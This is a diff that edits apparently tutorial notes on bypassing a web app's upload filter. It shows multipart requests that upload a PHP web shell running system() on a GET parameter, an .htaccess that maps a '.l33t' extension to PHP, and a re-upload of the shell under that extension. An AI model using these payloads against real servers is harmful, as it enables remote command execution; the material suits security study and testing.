@@ -183,11 +183,11 @@ Sorry, php files are not allowed.
 
 >> EXPLOIT
 
-the response provide information about the web server you are working on, so you can search for config files associated to the webserver you
+the response provide information about the web server you are working on, so you can search for default config files associated to the webserver you
 found. to attempt to force the app to use a different config file, you need to change a couple of parameters on the content disposition of the 
 request.
 
-> from
+> FROM
 
 ------WebKitFormBoundaryvzIa21H4a0qAp0T0
 Content-Disposition: form-data; name="avatar"; filename="cumbia.php"
@@ -195,19 +195,24 @@ Content-Type: text/php
 
 &lt;?php echo system($_GET['command']); ?&gt;
 
-> to
+> TO
 
 ------WebKitFormBoundaryvzIa21H4a0qAp0T0
-Content-Disposition: form-data; name="avatar"; .htaccess="cumbia.php"
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"
 Content-Type: text/plain
 
-&lt;?php echo system($_GET['command']); ?&gt;
+AddType application/x-httpd-php .l33t
 	
 <b>AND</b>
 
-modify the payload itself to force the server to use a new extension file as a valid extension to execute php payloads. 
+so we modified the payload itself to force the server to use a new extension file as a valid extension to execute php payloads. so, 
+the next step is to upload the exploit with the extension we just allowed. [.l33t]
 
+------WebKitFormBoundaryvzIa21H4a0qAp0T0
+Content-Disposition: form-data; name="avatar"; filename="cumbia.l33t"
+Content-Type: text/php
 
+&lt;?php echo system($_GET['command']); ?&gt;
 	
 </details>
 </div>
